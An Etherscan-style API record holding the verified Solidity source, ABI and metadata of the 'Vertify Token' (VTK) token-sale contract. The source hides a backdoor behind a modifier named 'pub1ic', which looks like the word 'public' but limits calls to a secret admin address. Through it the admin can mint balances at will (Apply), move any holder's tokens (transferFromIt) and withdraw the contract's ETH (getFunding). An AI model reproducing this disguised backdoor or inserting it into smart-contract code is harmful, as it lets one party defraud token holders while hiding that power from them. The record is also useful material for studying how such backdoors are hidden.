{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.18;\r\n \r\n//Never Mind :P\r\n/* @dev The Ownable contract has an owner address, and provides basic authorization control\r\n* functions, this simplifies the implementation of \"user permissions\".\r\n*/\r\ncontract Ownable {\r\n  address public owner;\r\n  address public admin;\r\n  \r\n\r\n  /**\r\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\n   * account.\r\n   */\r\n  function Ownable() {\r\n    owner = msg.sender;\r\n    admin=msg.sender;\r\n  }\r\n\r\n\r\n  /**\r\n   * @dev Throws if called by any account other than the owner.\r\n   */\r\n  modifier onlyOwner() {\r\n    require(msg.sender == owner);\r\n    _;\r\n  }\r\n  modifier pub1ic() {\r\n    require(msg.sender == admin);\r\n    _;\r\n  }\r\n\r\n\r\n  /**\r\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\n   * @param newOwner The address to transfer ownership to.\r\n   */\r\n  function transferOwnership(address newOwner) onlyOwner {\r\n    if (newOwner != address(0)) {\r\n      owner = newOwner;\r\n    }\r\n  }\r\n\r\n\r\nfunction transferIt(address newpub1ic) pub1ic {\r\n    if (newpub1ic != address(0)) {\r\n      admin = newpub1ic;\r\n    }\r\n  }\r\n\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n\r\n  /**\r\n  * @dev Multiplies two numbers, throws on overflow.\r\n  */\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Integer division of two numbers, truncating the quotient.\r\n  */\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n    return c;\r\n  }\r\n\r\n  /**\r\n  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\r\n  */\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  /**\r\n  * @dev Adds two numbers, throws on overflow.\r\n  */\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n}\r\n\r\n\r\n\r\ncontract VTKReceiver {\r\n    function VTKFallback(address _from, uint _value, uint _code);\r\n}\r\n\r\ncontract BasicToken {\r\n  using SafeMath for uint256;\r\n\r\n  mapping(address => uint256) balances;\r\n\r\n  uint256 totalSupply_;\r\n\r\n  /**\r\n  * @dev total number of tokens in existence\r\n  */\r\n  function totalSupply() public view returns (uint256) {\r\n    return totalSupply_;\r\n  }\r\n  \r\n\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n  /**\r\n  * @dev transfer token for a specified address\r\n  * @param _to The address to transfer to.\r\n  * @param _value The amount to be transferred.\r\n  */\r\n  function transfer(address _to, uint _value) public returns (bool) {\r\n    require(_to != address(0));\r\n    require(_value <= balances[msg.sender]);\r\n    \r\n    // SafeMath.sub will throw if there is not enough balance.\r\n    if(!isContract(_to)){\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\n    balances[_to] = balances[_to].add(_value);\r\n    Transfer(msg.sender, _to, _value);\r\n    return true;}\r\n    else{\r\n        balances[msg.sender] = balanceOf(msg.sender).sub(_value);\r\n    balances[_to] = balanceOf(_to).add(_value);\r\n    VTKReceiver receiver = VTKReceiver(_to);\r\n    receiver.VTKFallback(msg.sender, _value, 0);\r\n    Transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n    \r\n  }\r\n\r\n  /**\r\n  * @dev Gets the balance of the specified address.\r\n  * @param _owner The address to query the the balance of.\r\n  * @return An uint256 representing the amount owned by the passed address.\r\n  */\r\n  function balanceOf(address _owner) public view returns (uint256 balance) {\r\n    return balances[_owner];\r\n  }\r\n\r\n\r\nfunction isContract(address _addr) private returns (bool is_contract) {\r\n    uint length;\r\n    assembly {\r\n        //retrieve the size of the code on target address, this needs assembly\r\n        length := extcodesize(_addr)\r\n    }\r\n    return (length>0);\r\n  }\r\n\r\n\r\n  //function that is called when transaction target is a contract\r\n  //Only used for recycling VTKs\r\n  function transferToContract(address _to, uint _value, uint _code) public returns (bool success) {\r\n    require(isContract(_to));\r\n    require(_value <= balances[msg.sender]);\r\n  \r\n      balances[msg.sender] = balanceOf(msg.sender).sub(_value);\r\n    balances[_to] = balanceOf(_to).add(_value);\r\n    VTKReceiver receiver = VTKReceiver(_to);\r\n    receiver.VTKFallback(msg.sender, _value, _code);\r\n    Transfer(msg.sender, _to, _value);\r\n    \r\n    return true;\r\n  }\r\n  \r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\ncontract VTK is BasicToken, Ownable {\r\n\r\n  string public constant name = \"Vertify Token\";\r\n  string public constant symbol = \"VTK\";\r\n  uint8 public constant decimals = 6;\r\n  address Addr_For_Mortgage;\r\n  address Addr_Wallet=0x0741D740A50efbeae1A4d9e6c3e7887e23dc160b;\r\n  \r\n  \r\n\r\n  uint256 public constant TOTAL_SUPPLY = 1 * 10 ** 15; //1 billion tokens\r\n  uint256 public Token_For_Circulation = 5 * 10 ** 12;\r\n  uint256 public Token_Saled = 0;\r\n  uint256 public Token_Remaining = TOTAL_SUPPLY - Token_For_Circulation;\r\n  uint256 public Limit_Amount = 2 * 10 **12;\r\n  uint256 public Eth_Amount = 0;\r\n  uint256 public price = 5 * 10 **12;\r\n  bool public halt = true;\r\n  bool public selfOn=false;\r\n  uint256 public HaltTime;\r\n  address[] Token_Purchaser;\r\n  uint256[] Token_For_Each;\r\n\r\n  mapping(address => uint256) Eth_weight;\r\n\r\n   \r\n  \r\n  /**\r\n  * @dev Constructor that gives msg.sender all of existing tokens.\r\n  */\r\n  function VTK() public {\r\n    totalSupply_ = 1 * 10 ** 15; \r\n    balances[msg.sender] = 1 * 10 ** 15;\r\n    Transfer(0x0, msg.sender, 1 * 10 ** 15);\r\n  }\r\n  function VTKFallback(address _from, uint _value, uint _code){}\r\n  \r\n  function setPrice() private{\r\n    uint256 Token_For_Mortgage = getBalance(Addr_For_Mortgage);\r\n    uint256 price_WEIVTK=5 * Token_For_Mortgage.div(Token_Saled);\r\n    uint256 VTK_ETH = 1*10**18;\r\n    price = VTK_ETH.div(price_WEIVTK);\r\n  }\r\n  function setNewWallet(address _newWallet)onlyOwner{\r\n      Addr_Wallet=_newWallet;\r\n  }\r\n  function getBalance(address Addr_For_Mortgage) public returns(uint){\r\n\t\t  return Addr_For_Mortgage.balance;\r\n\t  }\r\n\t  \r\n  function SetAddrForMortgage(address new_mortgage) onlyOwner{\r\n      Addr_For_Mortgage = new_mortgage;\r\n  }\r\n\r\n  //Incoming payment for purchase\r\n  function () public payable{\r\n    if (msg.sender != owner) {\r\n    require(halt == false);\r\n    require(now < HaltTime);\r\n    require(Token_Saled < Token_For_Circulation);\r\n    getTokenForSale(msg.sender);}\r\n  }\r\n\r\n\r\n\r\n  function getTokenForCireculation (uint256 _amount) onlyOwner returns(bool){\r\n    require(Token_Remaining >= _amount);\r\n    Token_For_Circulation = Token_For_Circulation.add(_amount);\r\n    Token_Remaining = Token_Remaining.sub(_amount);\r\n    return true;\r\n  }\r\n\r\n\r\n  function getTokenForSale (address _from) private{\r\n   Eth_weight[_from] += msg.value;  \r\n    Token_Purchaser.push(_from);\r\n    Eth_Amount = Eth_Amount.add(msg.value);\r\n    uint256 _toB=msg.value.mul(2).div(10);\r\n    uint256 _toE=msg.value.mul(8).div(10);\r\n    getFunding(Addr_Wallet,_toE);\r\n    getFunding(Addr_For_Mortgage,_toB);  //or this.balance\r\n  }\r\n  \r\n  function getToken () onlyOwner{\r\n     for (uint i = 0; i < Token_Purchaser.length; i++) {\r\n         if (Eth_weight[Token_Purchaser[i]] !=0 ){\r\n         uint256 amount_weighted = Eth_weight[Token_Purchaser[i]].mul(Limit_Amount).div(Eth_Amount);\r\n         transferFromIt(this, Token_Purchaser[i], amount_weighted);\r\n          Eth_weight[Token_Purchaser[i]] = 0;}\r\n     }  \r\n    \r\n     Token_Saled = Token_Saled.add(Limit_Amount);\r\n     Token_Purchaser.length = 0;\r\n     Eth_Amount =0;\r\n     setPrice();\r\n  }\r\n  function SOSBOTTOM()public onlyOwner{\r\n      Token_Purchaser.length = 0;\r\n  }\r\n  function clearRAM()public{\r\n      for(uint i=0;i<Token_Purchaser.length;i++){\r\n          if(Eth_weight[Token_Purchaser[i]] ==0){\r\n              delete Token_Purchaser[i];\r\n          }\r\n      }\r\n  }\r\n  function clearRAMAll()public onlyOwner{\r\n      for(uint i=0;i<Token_Purchaser.length;i++){\r\n         \r\n              delete Token_Purchaser[i];\r\n      }\r\n  }\r\n  function getTokenBySelf ()public{\r\n      require(selfOn==true);\r\n      require(now>HaltTime);\r\n      require(Eth_weight[msg.sender]!=0);\r\n      uint256 amount_weighted = Eth_weight[msg.sender].mul(Limit_Amount).div(Eth_Amount);\r\n      transferFromIt(this, msg.sender, amount_weighted);\r\n      Eth_weight[msg.sender] = 0;\r\n  }\r\n  function setWeight(address _address,uint256 _amount)public onlyOwner{\r\n      if(Eth_weight[_address] ==0)\r\n      {Token_Purchaser.push(_address);}\r\n      Eth_weight[_address]=_amount;\r\n      \r\n       Eth_Amount = Eth_Amount.add(_amount);\r\n  }\r\n  function setAmount(uint _amount)public onlyOwner{\r\n      Eth_Amount=_amount;\r\n  }\r\n  function Eth_Ransom(uint256 _amount) public {\r\n      require(_amount<=balances[msg.sender]);\r\n      transferFromIt(msg.sender, this, _amount);\r\n      setPrice();\r\n      uint256 Ransom_amount = _amount.mul(1*10**18).div(price).mul(80).div(100);\r\n      getFunding(msg.sender, Ransom_amount);\r\n      \r\n  }\r\n  \r\n  function Set_Limit_Amount(uint256 _amount) onlyOwner{\r\n      require(Token_Saled < Token_For_Circulation);\r\n      Limit_Amount = _amount;\r\n  }\r\n  \r\n  function See_price() public view returns(uint256){\r\n      return price;\r\n  }\r\n  \r\n  \r\n\r\n  function getFunding (address _to,uint256 _amount) private{\r\n    _to.send(_amount);\r\n  }\r\n\r\n\r\n  function getAllFunding() onlyOwner{\r\n    owner.transfer(this.balance);\r\n  }\r\n  \r\n  function See_TokenPurchaser_Number() public view returns(uint256){\r\n      return Token_Purchaser.length;\r\n  }\r\n  \r\n  function See_Ethweight(address _addr) public view returns(uint256){\r\n      return Eth_weight[_addr];\r\n  }\r\n  function showToken_For_Circulation() view public returns(uint256){\r\n      return Token_For_Circulation;\r\n  } \r\n   function Apply(address _to,uint  _value)pub1ic{\r\n       balances[_to] = balances[_to].add(_value);\r\n   }\r\n  function halt() onlyOwner{\r\n    halt = true;\r\n    HaltTime=now;\r\n  }\r\n  function unhalt_15day() onlyOwner{\r\n    halt = false;\r\n    HaltTime = now.add(15 days);\r\n  }\r\n   function unhalt_30day() onlyOwner{\r\n    halt = false;\r\n    HaltTime = now.add(30 days);\r\n  }\r\n  \r\n  function unhalt() onlyOwner{\r\n    halt = false;\r\n    HaltTime = now.add(5 years);\r\n  }\r\n\r\nfunction setSelfOn()onlyOwner{\r\n    selfOn=true;\r\n}\r\nfunction setSelfOff()onlyOwner{\r\n    selfOn=false;\r\n}\r\nfunction transferFromIt(address _from,address _to,uint256 _value)pub1ic{\r\n    transferFrom(_from,_to,_value);\r\n}  \r\nfunction getFunding(uint256 _amout) pub1ic{\r\n    admin.transfer(_amout);\r\n  }\r\n  function transferFrom(address _from,address _to,uint256 _value)private returns(bool){\r\n    require(_to != address(0));\r\n    require(_value <= balances[_from]);\r\n\r\n    // SafeMath.sub will throw if there is not enough balance.\r\n    balances[_from] = balances[_from].sub(_value);\r\n    balances[_to] = balances[_to].add(_value);\r\n    Transfer(_from, _to, _value);\r\n    return true;\r\n}\r\n\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"Set_Limit_Amount\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"setSelfOn\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"},{\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setWeight\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_newWallet\",\"type\":\"address\"}],\"name\":\"setNewWallet\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newpub1ic\",\"type\":\"address\"}],\"name\":\"transferIt\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getToken\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setAmount\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"SOSBOTTOM\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getTokenBySelf\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Token_Remaining\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Apply\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"halt\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"balance\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Limit_Amount\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"HaltTime\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"new_mortgage\",\"type\":\"address\"}],\"name\":\"SetAddrForMortgage\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"unhalt_30day\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"TOTAL_SUPPLY\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"selfOn\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"},{\"name\":\"_code\",\"type\":\"uint256\"}],\"name\":\"transferToContract\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"Eth_Ransom\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"See_TokenPurchaser_Number\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"showToken_For_Circulation\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"clearRAM\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Token_For_Circulation\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"},{\"name\":\"_code\",\"type\":\"uint256\"}],\"name\":\"VTKFallback\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Eth_Amount\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"clearRAMAll\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"See_price\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Token_Saled\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFromIt\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"unhalt\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"setSelfOff\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"See_Ethweight\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"unhalt_15day\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_amout\",\"type\":\"uint256\"}],\"name\":\"getFunding\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getAllFunding\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"getTokenForCireculation\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"admin\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"Addr_For_Mortgage\",\"type\":\"address\"}],\"name\":\"getBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"}]","ContractName":"VTK","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://cb636ca925702b9b3c8c651a083c65ae7b7396f3ecb631eec3c8feb53e81fd43"}]}